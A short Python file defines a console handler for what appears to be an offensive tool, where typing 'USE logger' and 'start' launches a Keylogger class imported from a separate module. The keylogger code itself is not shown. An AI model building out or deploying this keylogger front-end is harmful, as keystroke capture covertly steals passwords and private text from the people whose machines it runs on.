import logger

# TODO separate the handler's args from the keylogger args
class Handler:
    def __init__(self, args):
        self.args = args
        self.module = ""

    def start(self):

        while True:
            command = str(input(f"{self.module} >> "))
            self.handle_command(command)

    def handle_command(self, command):
        if command[0:3] == "USE":
            self.module = command[4:]
        elif self.module == "logger":
            if command == "start":
                self.start_logger(self.args)

    def start_logger(self, args):
        kl = logger.Keylogger(args)
        kl.start()
